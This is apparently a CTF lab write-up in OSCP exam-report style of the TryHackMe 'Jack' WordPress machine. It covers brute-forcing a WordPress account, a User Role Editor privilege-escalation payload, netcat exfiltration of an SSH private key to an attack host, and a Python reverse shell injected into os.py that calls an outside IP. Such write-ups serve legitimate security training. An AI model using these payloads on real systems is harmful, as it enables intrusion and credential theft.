---
title: "Jack WP - Professional Exam Report (OSCP Style)"
author: ["ericgon28@proton.me", "OSID: XXXX"]
date: "2025-04-14"
subject: "Markdown"
keywords: [OSCP, Wordpress]
subtitle: "OSCP Exam Report"
lang: "en"
titlepage: true
titlepage-color: "DC143C"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: 
  - TryHackMe
tags:
  - Difícil
  - CTF
  - Wordpress
image: "https://github.com/user-attachments/assets/a5356a21-0b2a-42d3-89ee-3e0d540acd32"
---
# Jack WP - Professional Exam Report (OSCP Style)

## Introduction

This machine is a great way to learn about the different ways to enumerate and exploit WordPress.
To gain access, we must enumerate the server with WPScan; however, we will only get enough information to fully compromise it by performing an additional enumeration with Nmap scripts.
Finally, before we begin, we add "jack.thm" to the hosts file (/etc/hosts) as needed for name resolution.

## Objective

The goal of the machine is for us to have access and subsequently escalate privileges to have full control.

## Requirements

We have to have the following requirements:

- Nmap
- WPScan

**Exam Network**

10.10.97.82

# Independent Challenges

## Target #1 - 10.10.97.82

### Service Enumeration

**Port Scan Results**

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.97.82       | **TCP**: 22,80

**Nmap Scan Results:**

The Nmap scan reveals that Port 22 and Port 80 is open and running OpenSSH 7.2p2 and Apache 2.4.18 respectively.

![{DE40A305-E741-4BB4-80B0-053008D4FAC3}](https://github.com/user-attachments/assets/33425e15-b076-4c3e-8ab8-f72f58ffeb9a)


**SSH Enumeration**

From experience, we know that SSH is rarely vulnerable, and especially in this version, we searched for vulnerabilities with "searchsploit" and found a Python script that allows us to list existing users.
We'll leave it at that for now, as we don't have a list of possible valid users.

![{D2BF5A41-E380-4967-8F99-EBC9A5EE59B1}](https://github.com/user-attachments/assets/4c1f1cdd-c793-4661-b902-29437000055a)

**HTTP Enumeration**

We add the jack.thm domain referencing the machine's IP (10.10.97.82) in /etc/hosts.

![{462A6FF3-E1E5-464D-B4C3-CF0E06576281}](https://github.com/user-attachments/assets/9d462718-6131-43f3-9425-a7dc3b9d1976)

The server is running Jack’s personal blog.

![{5CD26E73-DFDF-4301-9FB7-B3F995F98876}](https://github.com/user-attachments/assets/1232d4d8-9053-4936-9596-9c1d9dbf4df8)

With the wappalyzer extension, we see information about the content manager and its version, which is interesting since we could search for any vulnerabilities associated with that version.

![{4271C40B-EDBD-4735-900F-8582F43DF37C}](https://github.com/user-attachments/assets/d45ef1a4-7575-40ad-9963-6dc4298a1762)

Whatweb also tells us the same thing but through the console.

![{0F342F98-756F-4436-A751-D6DC270B5A75}](https://github.com/user-attachments/assets/0b7403c2-e93c-48bd-99d2-7c7bba8a1307)

Now that we know the site is running Wordpress 5.3.2 we can start to enumerate some more specific information such as Plugins, Themes, Users, Config Backups, DB Exports and more. My tool of choice for Wordpress enumeration is WPScan.

We can use WPScan to enumerate the above items.

ap = All Plugins
at = All Themes
u = Enumerate Users

![{2AD6DF69-3C9F-4234-BD1B-B560B35DD2B4}](https://github.com/user-attachments/assets/b6c5bfb5-4024-44ec-b4cb-1f31cddba8c3)


### Explotation

Our results show that we have 3 users of value but very little else in terms of vulnerable plugins or themes.

![{BC9B5831-1AE1-4D3B-90FA-4F47A20D119A}](https://github.com/user-attachments/assets/72102aa0-a1ff-4e71-bf18-8549781ea97f)

![{BFC1CDDB-F3EF-4C1B-BA54-16BA0B39DD11}](https://github.com/user-attachments/assets/ce2d3d48-8953-4f82-a71d-c59091d38246)


Our next step will be to see if we can get a valid password for one of the three users. From our WPScan we can see that XML-RPC is accessible so we can use WPScan to execute the bruteforce attack.

![{D12AE816-5531-44B9-87F9-AA10C19B9233}](https://github.com/user-attachments/assets/e11f26eb-ef75-44ca-aa32-775a9d574199)

In this case, it worked and I quickly got the password for one of the accounts.

User              | Password
------------------|----------------------------------------
Wendy             | changelater

![{93463B0A-29C8-49FB-96BF-9E3CA3BE5C53}](https://github.com/user-attachments/assets/22419621-671c-46bf-aaa1-de03e7817010)

Now that we have enough information lets continue with the exploitation.
We can start by logging into Jack’s Wordpress site at http://jack.thm/wp-admin using the credentials obtained earlier.
Once logged in we realize that there's not much we can do so we need to enumerate a little more 

![{19D47617-20CB-450A-AC97-AE0931D91274}](https://github.com/user-attachments/assets/b7ecba2c-6ba2-4f2a-9d0a-d50e2f425698)

There are multiple other tools to enumerate Wordpress with, but lets revert back to Nmap with the following command

![{C8430A1F-2844-440E-8D09-D3EEF958DF35}](https://github.com/user-attachments/assets/33911f23-5773-4a76-8594-ccfeca0771c0)

We see a plugin with a known WordPress privilege escalation vulnerability called user-role-editor.
A simple search on searchsploit reveals the specific exploit.

![{568F4912-7BE0-402A-820E-BBD083CDD7D6}](https://github.com/user-attachments/assets/7de0789e-8213-4cbd-9ddd-9126a733fbc6)

After reviewing the exploit and some simple googling I constructed a fairly simple procedure using Burpsuite to gain privileged access to the Wordpress portal.

### Initial Access - WordPress Plugin User Role Editor < 4.25

**Vulnerability Explanation:** The plugin allows you to modify user roles in WordPress (permissions, capabilities, etc.).
The attacker (already with access to an account with a lower role, such as Editor) can send a malicious request to modify their own role or that of other users. This gives them access to critical functions, such as installing plugins, editing code, or changing site settings.

**Vulnerability Fix:** Update the plugin to version 4.25 or higher.

**Severity:** Critical

**Proof of Concept Code Here:** 

```python
-Log into Wordpress using obtained credentials
-Select “Profile”
-Start Burpsuite or http proxy of choice and start capturing web traffic
-Select “Update Profile”

-In Burpsuite take a look at the captured HTTP POST and add the following string at the end of the post “&ure_other_roles=administrator”

Code: &ure_other_roles=administrator
```

**Proof Screenshot:**

![{087D3C19-69F0-420E-975F-D45738726FC1}](https://github.com/user-attachments/assets/c6940e41-9da4-4904-8b93-31683116e751)

Click “Forward” to submit the HTTP Request and refresh the Wordpress Admin page, now showing more admin options, including the “Plugins” Menu.

![{4815834E-CE07-4D72-B7C7-9CACB5928C99}](https://github.com/user-attachments/assets/204c02f5-153e-4175-8e80-51c66bbec69d)

Next we need to get a reverse shell. In order to get the reverse shell I will create a custom Wordpress plugin containing a simple PHP Reverse Shell.
Create a new PHP file on your attack machine containing the following. I called it shell-plugin.php

![{D9852A2B-B301-42B0-AAC2-A907CFB6A0FF}](https://github.com/user-attachments/assets/05ab14e3-ec94-474a-87d5-358de25ae299)

Create a zip file from from the above PHP file using the following.

![{E8EFA2F1-9BF2-4D15-94D0-65FD053CAFF3}](https://github.com/user-attachments/assets/464fae7e-f5ca-4cd2-850d-c203a9218710)

Start netcat listener.

![{1721D29A-6E51-48B0-AF4B-293B0AD37FFB}](https://github.com/user-attachments/assets/3b0046e8-a3c6-4e82-b276-555f1bb2237b)

Next we’ll upload the plugin and activate reverse shell.

![{70F4389F-C527-4B97-A586-C9AA21FBB869}](https://github.com/user-attachments/assets/c6f0200f-acc5-44e1-a706-b5378a1bca81)

![{F595969E-C742-4A01-A689-AAA648BA14C3}](https://github.com/user-attachments/assets/50ab2649-54cf-4b0e-a33e-7539f1788b78)

We already have the shell and we are inside the machine.

![{A01C7814-A823-4989-8F75-EE18C68C8A99}](https://github.com/user-attachments/assets/7a06c1fe-cdfa-47f4-bc64-3b10f114cfcd)

### Privilege Escalation - Scheduled task

During the enumeration process I found a file in “/home/jack” called “reminder.txt”. This file led me to “/var/backups” where I found a SSH Private key to use for authentication called “id_rsa”
In order to use the file we first need to transfer the file to our attack machine, I used netcat with the following steps to transfer the file.

![{5BDFE159-26CC-49FA-9FE5-EFF3E3EF4D9F}](https://github.com/user-attachments/assets/fa0a79e6-10f5-4cf3-a9ed-bd7f3653d240)

![{3171309C-CED3-4C70-B1CD-91C592576F3D}](https://github.com/user-attachments/assets/81610b5a-0887-422b-a321-0cb0dc28458a)

To use the file, we first need to transfer it to our attack machine. I used netcat with the following steps to transfer the file.

On the attack machine, we start its netcat listener to receive the file: "sudo nc -nlvp 443 > id_rsa"

![{339741B0-9760-4471-820F-B5F6BB2575D9}](https://github.com/user-attachments/assets/eb304cb6-a94f-4b6b-8e47-cfb859b3ea0c)

On the target machine, we send the file to the attack machine using netcat by issuing the following command: "nc -nv <ATTACK IP> 443 < id_rsa"

![{96612589-CBD1-4167-9014-17300A8E0EAB}](https://github.com/user-attachments/assets/7256512e-b247-4752-9924-5e438535c6b2)

Once we have the file on the attack machine, we can use it to gain access to the target using SSH.
Assign the correct privileges to the SSH key using the following command: "chmod 600 id_rsa"

ssh -i id_rsa jack@<TARGET IP>

![{29FEBA1D-0552-45C1-8961-0CEC352E5D67}](https://github.com/user-attachments/assets/5d85edec-81d4-418e-9a46-726232cab025)

Great! We are now connected as Jack. Let’s find a way to elevate our privileges. Standard enumeration tools like linpeas.sh are great, but there is a great tool called pspy that will be particularly handy in our case.

![{3C7BCE91-6206-472E-A332-372439D3A6D2}](https://github.com/user-attachments/assets/e806f852-b2b3-4bc5-ab3c-3ce67a9f0606)

Using pspy, we can notice that there is a cron job running every 2 minutes:

![{3B21CDA6-8620-4866-B411-76F375EED2B3}](https://github.com/user-attachments/assets/3bba80c7-16b1-4b34-9e3b-4172de98e74c)

It appears the script does a simple http query to http://localhost using curl and then outputs everything to /opt/statuscheck/output.log.
When we take a look at the python script you’ll notice that it actually imports the Python OS module.

![{2B5E23B7-C6AD-4ADA-ABE8-5E6C9B94AB42}](https://github.com/user-attachments/assets/fcaf9e9c-6971-4912-aa57-c9f5eb5ef0c6)

Checking the rights we see that the family group of which we are a member has sufficient rights to the file.

![{1FBE5677-0A01-4C04-A094-0E79C27E7537}](https://github.com/user-attachments/assets/e9d0bb42-e873-4141-b456-e842e31d0011)

We edit the os.py file and add the following at the end of the file.

![{043188E5-8515-4FC5-83A3-DDB7B7D1D155}](https://github.com/user-attachments/assets/8f044f61-40ed-4f73-acea-49d91cf09f94)

We wait a minute or two and we get the session as root!

![{7B3C248C-71FD-4CDC-9A39-B6833A9F07A1}](https://github.com/user-attachments/assets/bd9bb103-9ba5-466f-b5c9-073ecc7d355b)

**Vulnerability Explanation:** Using the scheduled task of the checker.py script we have been able to modify the module that was imported so that root (which is the user that runs the script on the system) sends us a shell to our victim computer.

**Vulnerability Fix:** Modify script permissions.

**Severity:** Critical

**Proof of Concept Code Here:**

```python
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.9.1.238",443))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```


